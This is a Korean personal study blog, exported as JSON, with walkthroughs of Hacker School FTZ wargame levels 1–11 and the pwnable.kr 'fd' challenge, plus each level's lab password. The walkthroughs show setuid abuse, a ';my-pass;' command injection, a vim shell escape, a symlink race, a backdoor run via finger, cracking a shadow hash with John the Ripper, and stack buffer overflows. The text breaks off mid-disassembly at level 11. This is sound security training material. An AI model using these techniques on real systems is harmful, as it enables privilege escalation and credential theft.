[{"permalink":"//","layout":"default","title":"심심하다.","content":"# 심심하다.\n공부한거 정리하는 블로그\n\n## 소개\n* 성균관대학교 소프트웨어학과\n* 성균관대학교 CSL 학부연구생 2019 ~ 2020\n* 성균관대학교 정보보안동아리 HIT 회장 2020 ~ 2021\n* Best of the Best 9기 취약점분석트랙\n\n## 이력\n* 2020 한국차세대컴퓨팅학회 하계학술대회 장려상 - SGX를 이용한 엣지 서버로의 안전한 컴퓨팅 오프로드 방법\n* [2020 BoB 프로젝트 - PS4 hacking guideline](https://github.com/Hacker-s-PlayStation/PlayStation4-Hacking-Guideline)\n\n## 취미로 만들어본 것\n* [지뢰찾기 - java](https://github.com/Mysigyeong/Minesweeper)","dir":"/","name":"README.md","path":"README.md","url":"/"},{"sort":1,"permalink":"/hacker_school/","layout":"default","title":"Hacker school","content":"<h1 id=\"hacker-school\">Hacker school</h1>\n\n<p>해커스쿨 ftz, lob 풀이</p>\n\n<ul>\n <li><a href=\"/hacker_school/ftz/\">Free Training Zone</a>\n <ul>\n <li><a href=\"/hacker_school/ftz/level1.html\">Level 1</a></li>\n <li><a href=\"/hacker_school/ftz/level2.html\">Level 2</a></li>\n <li><a href=\"/hacker_school/ftz/level3.html\">Level 3</a></li>\n <li><a href=\"/hacker_school/ftz/level4.html\">Level 4</a></li>\n <li><a href=\"/hacker_school/ftz/level5.html\">Level 5</a></li>\n <li><a href=\"/hacker_school/ftz/level6.html\">Level 6</a></li>\n <li><a href=\"/hacker_school/ftz/level7.html\">Level 7</a></li>\n <li><a href=\"/hacker_school/ftz/level8.html\">Level 8</a></li>\n <li><a href=\"/hacker_school/ftz/level9.html\">Level 9</a></li>\n <li><a href=\"/hacker_school/ftz/level10.html\">Level 10</a></li>\n <li><a href=\"/hacker_school/ftz/level11.html\">Level 11</a></li>\n <li><a href=\"/hacker_school/ftz/level12.html\">Level 12</a></li>\n <li><a href=\"/hacker_school/ftz/level13.html\">Level 13</a></li>\n <li><a href=\"/hacker_school/ftz/level14.html\">Level 14</a></li>\n <li><a href=\"/hacker_school/ftz/level15.html\">Level 15</a></li>\n <li><a href=\"/hacker_school/ftz/level16.html\">Level 16</a></li>\n <li><a href=\"/hacker_school/ftz/level17.html\">Level 17</a></li>\n <li><a href=\"/hacker_school/ftz/level18.html\">Level 18</a></li>\n <li><a href=\"/hacker_school/ftz/level19.html\">Level 19</a></li>\n <li><a href=\"/hacker_school/ftz/level20.html\">Level 20</a></li>\n </ul>\n </li>\n <li><a href=\"/hacker_school/lob/\">The Lord Of The Bufferoverflow</a></li>\n</ul>\n","dir":"/hacker_school/","name":"README.md","path":"hacker_school/README.md","url":"/hacker_school/"},{"sort":1,"permalink":"/hacker_school/ftz/","layout":"default","title":"Free Training Zone","content":"<h1 id=\"free-training-zone\">Free Training Zone</h1>\n\n<p>해커스쿨 ftz 풀이. 간단한 리눅스 기능과 bof 공부 가능한 플랫폼<br />\nvm이미지를 이용하여 vm을 만들고 root계정으로 접속 후 ifconfig를 통해 ip를 알아낸 후 ssh로 접속하자.<br />\nftz local에서 하다간 잘못하면 암걸린다. 조심하자.<br /></p>\n\n<pre><code class=\"language-note\">id : root\n\npassword : hackerschool\n</code></pre>  \n<pre><code class=\"language-tip\">한글 깨짐 해결법\n\nexport LANG=ko_KR.euc-kr 입력\n\nXshell에서 인코딩 euc로 설정\n</code></pre>  \n\n<ul>\n <li><a href=\"/hacker_school/ftz/level1.html\">Level 1</a></li>\n <li><a href=\"/hacker_school/ftz/level2.html\">Level 2</a></li>\n <li><a href=\"/hacker_school/ftz/level3.html\">Level 3</a></li>\n <li><a href=\"/hacker_school/ftz/level4.html\">Level 4</a></li>\n <li><a href=\"/hacker_school/ftz/level5.html\">Level 5</a></li>\n <li><a href=\"/hacker_school/ftz/level6.html\">Level 6</a></li>\n <li><a href=\"/hacker_school/ftz/level7.html\">Level 7</a></li>\n <li><a href=\"/hacker_school/ftz/level8.html\">Level 8</a></li>\n <li><a href=\"/hacker_school/ftz/level9.html\">Level 9</a></li>\n <li><a href=\"/hacker_school/ftz/level10.html\">Level 10</a></li>\n <li><a href=\"/hacker_school/ftz/level11.html\">Level 11</a></li>\n <li><a href=\"/hacker_school/ftz/level12.html\">Level 12</a></li>\n <li><a href=\"/hacker_school/ftz/level13.html\">Level 13</a></li>\n <li><a href=\"/hacker_school/ftz/level14.html\">Level 14</a></li>\n <li><a href=\"/hacker_school/ftz/level15.html\">Level 15</a></li>\n <li><a href=\"/hacker_school/ftz/level16.html\">Level 16</a></li>\n <li><a href=\"/hacker_school/ftz/level17.html\">Level 17</a></li>\n <li><a href=\"/hacker_school/ftz/level18.html\">Level 18</a></li>\n <li><a href=\"/hacker_school/ftz/level19.html\">Level 19</a></li>\n <li><a href=\"/hacker_school/ftz/level20.html\">Level 20</a></li>\n</ul>\n","dir":"/hacker_school/ftz/","name":"README.md","path":"hacker_school/ftz/README.md","url":"/hacker_school/ftz/"},{"sort":1,"layout":"default","title":"Level 1","content":"# Level 1\r\n\r\n```note\r\nid : level1\r\n\r\npassword : level1\r\n```\r\n\r\n```bash\r\n[level1@ftz level1]$ cat hint\r\n\r\nlevel2 권한에 setuid가 걸린 파일을 찾는다.\r\n```\r\n\r\nfind 명령어를 통해 해당 파일을 찾을 수 있다. find 명령어에 대해 잘 모른다면 `man find`를 통해 살펴보자.\r\n\r\n```bash\r\n[level1@ftz level1]$ find / -user level2 -perm +4000 2> /dev/null\r\n/bin/ExecuteMe\r\n[level1@ftz level1]$ ls -al /bin/ExecuteMe\r\n-rwsr-x--- 1 level2 level1 12868 9월 10 2011 /bin/ExecuteMe\r\n```\r\n\r\nsetuid가 걸려있기 때문에 ExecuteMe를 실행하면 level2의 권한을 얻게된다.<br>\r\nmy-pass는 안되기 때문에 level2권한의 shell을 얻기 위해서 bash를 실행한다.\r\n\r\n```bash\r\n\t\t레벨2의 권한으로 당신이 원하는 명령어를\r\n\t\t한가지 실행시켜 드리겠습니다.\r\n\t\t(단, my-pass 와 chmod는 제외)\r\n\r\n\t\t어떤 명령을 실행시키겠습니까?\r\n\r\n\r\n\t\t[level2@ftz level2]$ bash\r\n\r\n\r\n[level2@ftz level2]$ my-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nfind를 통해 원하는 파일을 탐색할 수 있다.\r\n\r\nshell은 명령어를 실행시켜줄 수 있는 프로그램이다.\r\n```","dir":"/hacker_school/ftz/","name":"level1.md","path":"hacker_school/ftz/level1.md","url":"/hacker_school/ftz/level1.html"},{"sort":1,"layout":"default","title":"brain fuck","content":"<h1 id=\"brain-fuck\">brain fuck</h1>\n\n<p>추후에 정리</p>\n","dir":"/pwnable.kr/rookiss/","name":"bf.md","path":"pwnable.kr/rookiss/bf.md","url":"/pwnable.kr/rookiss/bf.html"},{"sort":1,"permalink":"/pwnable.kr/toddler/","layout":"default","title":"Toddler’s Bottle","content":"<h1 id=\"toddlers-bottle\">Toddler’s Bottle</h1>\n\n<ul>\n <li><a href=\"/pwnable.kr/toddler/fd.html\">fd</a></li>\n</ul>\n","dir":"/pwnable.kr/toddler/","name":"README.md","path":"pwnable.kr/toddler/README.md","url":"/pwnable.kr/toddler/"},{"sort":1,"layout":"default","title":"fd","content":"# fd\r\n\r\nhome 디렉토리에 fd.c파일을 확인하면 소스코드를 볼 수 있다.\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\nchar buf[32];\r\nint main(int argc, char* argv[], char* envp[]){\r\n if(argc<2){\r\n printf(\"pass argv[1] a number\\n\");\r\n return 0;\r\n }\r\n int fd = atoi( argv[1] ) - 0x1234;\r\n int len = 0;\r\n len = read(fd, buf, 32);\r\n if(!strcmp(\"LETMEWIN\\n\", buf)){\r\n printf(\"good job :)\\n\");\r\n system(\"/bin/cat flag\");\r\n exit(0);\r\n }\r\n printf(\"learn about Linux file IO\\n\");\r\n return 0;\r\n\r\n}\r\n```\r\n\r\nfd는 file descriptor의 약자로 fd가 0일땐 stdin, fd가 1일땐 stdout, fd가 2일땐 stderr를 나타낸다.\r\n따라서 fd값이 0이 되도록 argv[1]에 4660(0x1234, atoi는 10진수로만 해석함)을 넣고 read를 통해 LETMEWIN을 입력해주면 된다.\r\n\r\n```bash\r\nfd@pwnable:~$ ./fd 4660\r\nLETMEWIN\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nfd\r\n```","dir":"/pwnable.kr/toddler/","name":"fd.md","path":"pwnable.kr/toddler/fd.md","url":"/pwnable.kr/toddler/fd.html"},{"sort":2,"layout":"default","title":"Level 2","content":"# Level 2\r\n\r\n```note\r\nid : level2\r\n\r\npassword : hacker or cracker\r\n```\r\n\r\n```bash\r\n[level2@ftz level2]$ cat hint\r\n\r\n텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...\r\n```\r\n\r\nlevel1과 마찬가지로 setuid가 걸려있는 파일을 찾자.\r\n\r\n```bash\r\n[level2@ftz level2]$ find / -user level3 -perm +4000 2> /dev/null\r\n/usr/bin/editor\r\n[level2@ftz level2]$ ls -al /usr/bin/editor\r\n-rwsr-x--- 1 level3 level2 11651 Sep 10 2011 /usr/bin/editor\r\n```\r\n\r\nsetuid가 걸려있기 때문에 editor를 실행하면 level3의 권한을 얻게된다.<br>\r\neditor를 실행하면 VIM이 실행이 된다. VIM은 Linux에서 사용되는 메모장이다.<br>\r\na, i 등의 키를 이용하여 텍스트 수정 모드로 들어갈 수 있고 esc키를 이용하여 명령어 모드로 들어갈 수 있다.<br>\r\n명령어모드에서 :!를 이용하면 shell 명령어를 사용할 수 있다.\r\n\r\n```bash\r\n:!my-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nVIM 사용법\r\n```","dir":"/hacker_school/ftz/","name":"level2.md","path":"hacker_school/ftz/level2.md","url":"/hacker_school/ftz/level2.html"},{"sort":2,"permalink":"/hacker_school/lob/","layout":"default","title":"The Lord Of The Bufferoverflow","content":"<h1 id=\"the-lord-of-the-bufferoverflow\">The Lord Of The Bufferoverflow</h1>\n\n<p>해커스쿨 lob 풀이.</p>\n\n","dir":"/hacker_school/lob/","name":"README.md","path":"hacker_school/lob/README.md","url":"/hacker_school/lob/"},{"sort":2,"permalink":"/pwnable.kr/","layout":"default","title":"pwnable.kr","content":"<h1 id=\"pwnablekr\">pwnable.kr</h1>\n\n<p>pwnable 공부할 수 있는 사이트.</p>\n\n<ul>\n <li><a href=\"/pwnable.kr/toddler/\">Toddler’s Bottle</a>\n <ul>\n <li><a href=\"/pwnable.kr/toddler/fd.html\">fd</a></li>\n </ul>\n </li>\n <li><a href=\"/pwnable.kr/rookiss/\">Rookiss</a>\n <ul>\n <li><a href=\"/pwnable.kr/rookiss/bf.html\">brain fuck</a></li>\n </ul>\n </li>\n</ul>\n","dir":"/pwnable.kr/","name":"README.md","path":"pwnable.kr/README.md","url":"/pwnable.kr/"},{"sort":2,"permalink":"/pwnable.kr/rookiss/","layout":"default","title":"Rookiss","content":"<h1 id=\"rookiss\">Rookiss</h1>\n\n<ul>\n <li><a href=\"/pwnable.kr/rookiss/bf.html\">brain fuck</a></li>\n</ul>\n","dir":"/pwnable.kr/rookiss/","name":"README.md","path":"pwnable.kr/rookiss/README.md","url":"/pwnable.kr/rookiss/"},{"sort":3,"layout":"default","title":"Level 3","content":"# Level 3\r\n\r\n```note\r\nid : level3\r\n\r\npassword : can you fly?\r\n```\r\n\r\nhint를 보면 autodig의 소스코드를 뱉는다.\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n \r\nint main(int argc, char **argv){\r\n \r\n char cmd[100];\r\n \r\n if( argc!=2 ){\r\n printf( \"Auto Digger Version 0.9\\n\" );\r\n printf( \"Usage : %s host\\n\", argv[0] );\r\n exit(0);\r\n }\r\n \r\n strcpy( cmd, \"dig @\" );\r\n strcat( cmd, argv[1] );\r\n strcat( cmd, \" version.bind chaos txt\");\r\n \r\n system( cmd );\r\n \r\n}\r\n```\r\n\r\n아래와 같이 autodig에는 setuid가 걸려있어서 실행하면 level4의 권한을 얻게된다.\r\n\r\n```bash\r\n[level3@ftz level3]$ ls -al `which autodig`\r\n-rwsr-x--- 1 level4 level3 12194 Sep 10 2011 /bin/autodig\r\n```\r\n\r\n소스코드를 보니 최종적으로 `dig @argv[1] version.bind chaos txt`가 실행되는 것을 알 수 있다.<br>\r\ndig가 뭘 하는지는 관심없고, 우리는 그저 level4의 비밀번호를 얻는게 목적이니 `;my-pass;`를 넣어준다.<br><br>\r\n`;my-pass;`를 큰따옴표로 감싸야 세미콜론을 문자열로써 인식하게 된다. \r\n\r\n```bash\r\n[level3@ftz level3]$ autodig \";my-pass;\"\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nshell 한 줄에서 여러 명령어 실행하기\r\n```","dir":"/hacker_school/ftz/","name":"level3.md","path":"hacker_school/ftz/level3.md","url":"/hacker_school/ftz/level3.html"},{"sort":4,"layout":"default","title":"Level 4","content":"# Level 4\r\n\r\n```note\r\nid : level4\r\n\r\npassword : suck my brain\r\n```\r\n\r\n```bash\r\n[level4@ftz level4]$ cat hint\r\n\r\n누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!\r\n```\r\n\r\nxinetd.d에는 여러가지 서비스 설정파일들이 존재한다.<br>\r\n일단 뭐가 있는지 궁금하니 가서 살펴보자.\r\n\r\n```bash\r\n[level4@ftz level4]$ cd /etc/xinetd.d\r\n[level4@ftz xinetd.d]$ ls -al\r\ntotal 88\r\ndrwxr-xr-x 2 root root 4096 Sep 10 2011 .\r\ndrwxr-xr-x 52 root root 4096 Jan 7 18:41 ..\r\n-r--r--r-- 1 root level4 171 Sep 10 2011 backdoor\r\n-rw-r--r-- 1 root root 560 Dec 19 2007 chargen\r\n-rw-r--r-- 1 root root 580 Dec 19 2007 chargen-udp\r\n```\r\n\r\n대놓고 backdoor라고 적혀있다.<br>\r\n뭐라고 적혀있는지 살펴보자.\r\n\r\n```bash\r\n[level4@ftz xinetd.d]$ cat backdoor\r\nservice finger \r\n{\r\n\tdisable\t= no\r\n\tflags\t\t= REUSE\r\n\tsocket_type\t= stream \r\n\twait\t\t= no\r\n\tuser\t\t= level5\r\n\tserver\t\t= /home/level4/tmp/backdoor\r\n\tlog_on_failure\t+= USERID\r\n}\r\n```\r\n\r\nfinger는 사용자 계정 정보와 최근 로그인 정보, 이메일, 예약 작업 정보 등을 볼 수 있도록 하는 것이다.<br>\r\nlevel5 유저가 사용할 경우 /home/level4/tmp/backdoor를 실행시키는 것으로 여겨진다. 그러나 해당 파일이 존재하지 않는다.<br>\r\n따라서 level5의 비밀번호를 뱉어내는 backdoor를 직접 만들어내고 finger를 통해 실행시켜야한다.\r\n\r\n```c\r\n// /home/level4/tmp/backdoor.c\r\n// gcc -o backdoor backdoor.c\r\n\r\n#include <unistd.h>\r\n\r\nint main(void)\r\n{\r\n\tsystem(\"my-pass\");\r\n\treturn 0;\r\n}\r\n```\r\n\r\n이제 finger를 실행시켜서 backdoor를 실행시키면 된다.<br>\r\nfinger를 그냥 실행시키면 level5유저로써 사용되지 않기 때문에 아래와 같이 remote형태로 사용해야한다.\r\n\r\n```bash\r\n[level4@ftz tmp]$ finger level5@localhost\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nxinetd.d에는 서비스 설정 파일들이 존재한다.\r\n\r\nfinger 서비스\r\n```","dir":"/hacker_school/ftz/","name":"level4.md","path":"hacker_school/ftz/level4.md","url":"/hacker_school/ftz/level4.html"},{"sort":5,"layout":"default","title":"Level 5","content":"# Level 5\r\n\r\n```note\r\nid : level5\r\n\r\npassword : what is your name?\r\n```\r\n\r\n```bash\r\n[level5@ftz level5]$ cat hint\r\n\r\n/usr/bin/level5 프로그램은 /tmp 디렉토리에\r\nlevel5.tmp 라는 이름의 임시파일을 생성한다.\r\n\r\n이를 이용하여 level6의 권한을 얻어라.\r\n```\r\n\r\nlevel5를 실행시킨 후 /tmp폴더를 살펴보았으나 level5.tmp파일은 보이지 않았다.<br>\r\n임시파일이 프로그램 종료 전에 삭제가 되는 것으로 여겨진다.\r\n\r\n```bash\r\n[level5@ftz level5]$ ls -al /tmp\r\ntotal 8\r\ndrwxrwxrwt 2 root root 4096 Jan 7 20:16 .\r\ndrwxr-xr-x 20 root root 4096 Jan 7 18:41 ..\r\nsrwxrwxrwx 1 mysql mysql 0 Jan 7 18:41 mysql.sock\r\n```\r\n\r\n삭제가 되기 전에 파일내용을 낚아채기 위해 symbolic link를 사용했다.<br>\r\nsymbolic link는 리눅스에 있는 hyperlink기능으로 아래와 같이 asdf파일을 생성한 후 level5.tmp라는 이름의 symbolic link를 만들어놓으면 level5가 level5.tmp symbolic link를 통해 asdf에 내용물을 작성하게 된다.\r\n\r\n```bash\r\n[level5@ftz level5]$ touch /tmp/asdf\r\n[level5@ftz level5]$ ln -s /tmp/asdf /tmp/level5.tmp\r\n[level5@ftz level5]$ ls -al /tmp\r\ntotal 8\r\ndrwxrwxrwt 2 root root 4096 Jan 7 20:29 .\r\ndrwxr-xr-x 20 root root 4096 Jan 7 18:41 ..\r\n-rw-rw-r-- 1 level5 level5 0 Jan 7 20:29 asdf\r\nlrwxrwxrwx 1 level5 level5 9 Jan 7 20:29 level5.tmp -> /tmp/asdf\r\nsrwxrwxrwx 1 mysql mysql 0 Jan 7 18:41 mysql.sock\r\n[level5@ftz level5]$ level5\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nsymbolic link\r\n```","dir":"/hacker_school/ftz/","name":"level5.md","path":"hacker_school/ftz/level5.md","url":"/hacker_school/ftz/level5.html"},{"sort":6,"layout":"default","title":"Level 6","content":"# Level 6\r\n\r\n```note\r\nid : level6\r\n\r\npassword : what the hell\r\n```\r\n\r\n```bash\r\nhint - 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.\r\n```\r\n\r\nlevel6에 접속하자마자 위와 같이 hint가 나온다.<br>\r\n엔터를 누르면 아래와 같이 텔넷 접속 서비스가 나온다.\r\n\r\n```bash\r\n #####################################\r\n ## ##\r\n ## 텔넷 접속 서비스 ##\r\n ## ##\r\n ## ##\r\n ## 1. 하이텔 2. 나우누리 ##\r\n ## 3. 천리안 ##\r\n ## ##\r\n #####################################\r\n\r\n접속하고 싶은 bbs를 선택하세요 : \r\n```\r\n\r\n하이텔 나우누리 천리안은 모두 과거의 산물이어서 지금은 접속도 안된다.<br>\r\n그리고 우리는 저 사이트들로 접속하는 것이 목표가 아니라 shell을 획득하는 것이 목표다.<br>\r\n텔넷 접속 서비스 프로그램을 종료하면 shell을 획득할 수 있을 것으로 보인다.<br>\r\n따라서 `Ctrl + c`를 통해 KeyboardInterrupt 시그널을 날렸다. 그러나 텔넷 접속 서비스화면에서는 `Can't use ctrl+c`라는 문구가 출력되면서 interrupt에 대한 핸들링이 되어있었다. 따라서 `Ctrl + \\`을 통해서 다른 시그널을 통해서 종료하는 것을 시도했다. 하지만 shell과의 접속 자체가 끊겨버렸다.<br>\r\n텔넷 접속 서비스로 넘어가기 전, hint에서 `Ctrl + c`를 해야했다.<br>\r\nhint단계에서 interrupt를 날려서 shell을 획득할 수 있었고, level6의 home directory에 password파일이 존재했다.\r\n\r\n## 추가\r\n\r\n.bashrc는 bash가 처음에 실행이 될 때 실행할 명령어들을 담아놓은 파일이다. 아래의 .bashrc를 살펴보면 `./tn`이 자동으로 실행되도록 한 것을 볼 수 있다.\r\n\r\n```\r\n# .bashrc\r\n\r\n# User specific aliases and functions\r\n\r\n# Source global definitions\r\nif [ -f /etc/bashrc ]; then\r\n . /etc/bashrc\r\nfi\r\nexport PS1=\"[\\u@\\h \\W]\\$ \"\r\n./tn\r\nlogout\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\n시그널\r\n\r\n.bashrc\r\n```","dir":"/hacker_school/ftz/","name":"level6.md","path":"hacker_school/ftz/level6.md","url":"/hacker_school/ftz/level6.html"},{"sort":7,"layout":"default","title":"Level 7","content":"# Level 7\r\n\r\n```note\r\nid : level7\r\n\r\npassword : come together\r\n```\r\n\r\n```bash\r\n[level7@ftz level7]$ cat hint\r\n\r\n/bin/level7 명령을 실행하면, 패스워드 입력을 요청한다.\r\n\r\n1. 패스워드는 가까운곳에..\r\n2. 상상력을 총동원하라.\r\n3. 2진수를 10진수를 바꿀 수 있는가?\r\n4. 계산기 설정을 공학용으로 바꾸어라.\r\n```\r\n\r\nlevel7을 실행시켜보니 비밀번호입력을 요구했고, 모르기때문에 막 눌러보니 /bin/wrong.txt파일이 없다고 떴다.<br>\r\nwrong.txt파일에 힌트가 있어야 할 것으로 여겨지는데 파일이 존재하지 않는다.\r\n\r\n```bash\r\n[level7@ftz level7]$ level7\r\nInsert The Password : asdf\r\ncat: /bin/wrong.txt: No such file or directory\r\n```\r\n\r\n원래는 아래와 같은 힌트가 주어져야한다고 한다.\r\n\r\n```\r\n--_--_- --____- ---_-__ --__-_-\r\n```\r\n\r\n각 자리가 7글자인 것을 보니 대놓고 ascii라고 외쳐대는 것 같다. -를 1, _을 0으로 놓고 이진수로써 해석을 하고, ascii코드에 대입하면 mate가 나온다.\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\n이진수\r\n\r\nascii\r\n```","dir":"/hacker_school/ftz/","name":"level7.md","path":"hacker_school/ftz/level7.md","url":"/hacker_school/ftz/level7.html"},{"sort":8,"layout":"default","title":"Level 8","content":"# Level 8\r\n\r\n```note\r\nid : level8\r\n\r\npassword : break the world\r\n```\r\n\r\n```bash\r\n[level8@ftz level8]$ cat hint\r\n\r\nlevel9의 shadow 파일이 서버 어딘가에 숨어있다.\r\n그 파일에 대해 알려진 것은 용량이 \"2700\"이라는 것 뿐이다.\r\n```\r\n\r\nlevel1에서 사용했던 find 명령어를 이용해 파일의 크기를 옵션으로 두고 찾으면 된다.<br> \r\n누가봐도 found.txt가 의심스럽다.\r\n\r\n```bash\r\n[level8@ftz level8]$ find / -size 2700c 2> /dev/null\r\n/var/www/manual/ssl/ssl_intro_fig2.gif\r\n/etc/rc.d/found.txt\r\n/usr/share/man/man3/IO::Pipe.3pm.gz\r\n/usr/share/man/man3/URI::data.3pm.gz\r\n```\r\n\r\nshadow 파일은 사용자의 비밀번호를 암호화해서 저장해놓은 것으로 다음과 같은 형식을 가진다.\r\n\r\n```note\r\n### shadow 파일 형식\r\n\r\n1:2:3:4:5:6:7:8:9\r\n\r\n1. 사용자 id\r\n2. 비밀번호 정보\r\n $1$2$3\r\n 1. hash 알고리즘\r\n * 1: md5\r\n * 2: BlowFish\r\n * 5: SHA256\r\n * 6: SHA512\r\n 2. salt\r\n 3. 비밀번호 hash값\r\n3. 마지막 패스워드 변경날짜\r\n4. 패스워드 최소 사용기간\r\n5. 패스워드 최대 사용기간\r\n6. 경고일\r\n7. 비활성날짜\r\n8. 만료일\r\n9. 사용안함\r\n```\r\n\r\n중요한건 비밀번호 정보다. md5를 이용해 비밀번호에 salt값(vkY6sSlG)을 붙여서 hash값을 도출해 낸 것이 vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.라고 한다.<br>\r\nhash는 일방향함수이기 때문에 복호화를 할 수 없다. 복호화를 하는 방법은 일일이 전부다 hash함수를 돌려보면서 어떤 input값이 어떤 hash값을 도출해내는지 보는 수 밖에 없다.\r\n\r\n```\r\nlevel9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524\r\n```\r\n\r\nJohn the Ripper라는 password cracker 프로그램이 있어서 이를 활용했다.<br>\r\nlevel9의 shadow파일 내용을 복사하여 level9.txt 파일로 만든 후 해당 파일을 넣고 돌렸다.\r\n\r\n```powershell\r\nPS C:\\john-1.9.0-jumbo-1-win64> .\\run\\john.exe .\\level9.txt\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nshadow 파일\r\n\r\nhash\r\n```","dir":"/hacker_school/ftz/","name":"level8.md","path":"hacker_school/ftz/level8.md","url":"/hacker_school/ftz/level8.html"},{"sort":9,"layout":"default","title":"Level 9","content":"# Level 9\r\n\r\n```note\r\nid : level9\r\n\r\npassword : apple\r\n```\r\n\r\n힌트를 보면 /usr/bin/bof의 소스코드를 준다.\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n \r\nmain(){\r\n \r\n char buf2[10];\r\n char buf[10];\r\n \r\n printf(\"It can be overflow : \");\r\n fgets(buf,40,stdin);\r\n \r\n if ( strncmp(buf2, \"go\", 2) == 0 )\r\n {\r\n printf(\"Good Skill!\\n\");\r\n setreuid( 3010, 3010 );\r\n system(\"/bin/bash\");\r\n }\r\n \r\n}\r\n```\r\n\r\nbof는 buffer overflow의 약자로 말 그대로 buffer가 넘쳐버리는 취약점이다.<br>\r\nbuf의 크기는 10byte인데 fgets를 통해서 입력받는 길이는 40byte기 때문에 30byte가 넘쳐버린다.<br>\r\n이는 메모리에 있는 다른 값을 변조시키게 되기 때문에 프로그램이 조져지게된다.<br><br>\r\nstack은 대충 아래처럼 생겼을 것인데 정확하게 하려면 buf와 buf2사이의 간격을 알아내야겠지만 어차피 strncmp에서 두글자만 비교하기 때문에 대충했다.\r\n\r\n<img src=\"/picture/hacker_school/ftz/level9.png\" width=\"300\"/>\r\n\r\n```bash\r\n[level9@ftz level9]$ bof\r\nIt can be overflow : gogogogogogogogogogogogogogo\r\nGood Skill!\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow\r\n```","dir":"/hacker_school/ftz/","name":"level9.md","path":"hacker_school/ftz/level9.md","url":"/hacker_school/ftz/level9.html"},{"sort":10,"layout":"default","title":"Level 10","content":"# Level 10\r\n\r\n```note\r\nid : level10\r\n\r\npassword : interesting to hack!\r\n```\r\n\r\n```bash\r\n[level10@ftz level10]$ cat hint\r\n\r\n두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.\r\n그 대화방은 공유 메모리를 이용하여 만들어졌으며, \r\nkey_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여 \r\nlevel11의 권한을 얻어라.\r\n```\r\n\r\n리눅스의 공유메모리 사용 api를 이용하여 도청하면 된다.<br>\r\ntmp폴더 안에서 코딩을 하면 된다.\r\n\r\n```c\r\n#include <sys/shm.h>\r\n#include <sys/ipc.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n\r\nint main(void)\r\n{\r\n int key = 7530;\r\n void* memory;\r\n int id = shmget(key, 0, IPC_CREAT);\r\n if (id < 0) exit(1);\r\n memory = shmat(id, NULL, 0);\r\n if (memory < 0) exit(1);\r\n puts(memory);\r\n\r\n return 0;\r\n}\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\n공유메모리\r\n```","dir":"/hacker_school/ftz/","name":"level10.md","path":"hacker_school/ftz/level10.md","url":"/hacker_school/ftz/level10.html"},{"sort":11,"layout":"default","title":"Level 11","content":"# Level 11\r\n\r\n```note\r\nid : level11\r\n\r\npassword : what!@#$?\r\n```\r\n\r\nlevel10까지는 리눅스 사용방법좀 소개하는 튜토리얼식이었는데 level11부터는 그냥 쌩 pwnable문제가 나온다.<br><br>\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n \r\nint main( int argc, char *argv[] )\r\n{\r\n\tchar str[256];\r\n\r\n \tsetreuid( 3092, 3092 );\r\n\tstrcpy( str, argv[1] );\r\n\tprintf( str );\r\n}\r\n```\r\n\r\nstrcpy는 문자열의 길이에 상관없이 NULL문자를 만날때까지 복사를 한다. 따라서 buffer overflow 취약점이 존재한다.\r\n\r\n## Buffer Overflow 풀이\r\n\r\nbuffer overflow를 통해 stack의 return address를 조작할 수 있고, 이는 함수가 끝날 때 정상적으로 이전 함수로 돌아가는 것이 아니라 공격자가 조작한 루틴으로 가게 할 수 있다. 따라서 쉘을 실행시켜주는 코드인 shellcode를 주입한 후, 해당 shellcode로 점프하게끔 아래와 같은 상황을 만들어주면 될 것이다.\r\n\r\n<img src=\"/picture/hacker_school/ftz/level11_1.png\" width=\"1000\"/>\r\n\r\nGDB를 이용하여 attackme의 main함수를 disassemble했다.\r\n\r\n<pre>\r\n(gdb) disas main\r\nDump of assembler code for function main:\r\n0x08048470 (main+0):\tpush   %ebp\r\n0x08048471 (main+1):\tmov    %esp,%ebp\r\n0x08048473 (main+3):\tsub    $0x108,%esp\r\n0x08048479 (main+9):\tsub    $0x8,%esp\r\n0x0804847c (main+12):\tpush   $0xc14\r\n0x08048481 (main+17):\tpush   $0xc14\r\n0x08048486 (main+22):\tcall   0x804834c (setreuid)\r\n0x0804848b (main+27):\tadd    $0x10,%esp\r\n0x0804848e (main+30):\tsub    $0x8,%esp\r\n0x08048491 (main+33):\tmov    0xc(%ebp),%eax\r\n0x08048494 (main+36):\tadd    $0x4,%eax\r\n0x08048497 (main+39):\tpushl  (%eax)\r\n\r\n<b>0x08048499 (main+41):\tlea    0xfffffef8(%ebp),%eax\r\n0x0804849f (main+47):\tpush   %eax\r\n0x080484a0 (main+48):\tcall   0x804835c (strcpy) </b>\r\n\r\n0x080484a5 (main+53):\tadd    $0x10,%esp\r\n0x080484a8 (main+56):\tsub    $0xc,%esp\r\n0x080484ab (main+59):\tlea    0xfffffef8(%ebp),%eax\r\n0x080484b1 (main+65):\tpush   %eax\r\n0x080484b2 (main+66):\tcall   0x804833c (printf)\r\n0x080484b7 (main+71):\tadd    $0x10,%esp\r\n0x080484ba (main+74):\tleave  \r\n0x080484bb (main+75):\tret\r\n</pre>  